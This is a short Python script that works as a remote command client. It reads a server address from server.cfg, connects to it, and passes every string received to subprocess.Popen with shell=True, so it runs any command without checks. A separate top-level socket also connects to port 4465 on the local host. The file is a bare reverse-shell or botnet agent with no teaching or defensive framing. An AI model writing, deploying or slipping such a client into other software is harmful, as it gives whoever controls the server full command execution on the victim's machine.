import socket 
import subprocess
import threading
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((socket.gethostbyname(socket.gethostname()), 4465))
s.send("owo".encode())

class Client:
    def __init__(self):
        self.ip = str 
        self.port = int 
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    def start(self):
        self.read_cfg()
        self.connect()
        threading.Thread(target=self.listen).start()
    def read_cfg(self):
        with open("server.cfg", "r") as config:
            cfg = config.read()
            self.port = cfg.split("\n")[0].split("=")[1]
            self.ip=cfg.split("\n")[2].split("=")[1]

    def connect(self):
        self.socket.connect((self.ip, int(self.port)))
    def listen(self):
        while True:
            self.command = self.socket.recv(2048).decode()
            self.execute(str(self.command))
    def execute(self, command):
        subprocess.Popen(command, shell=True)
Client().start()
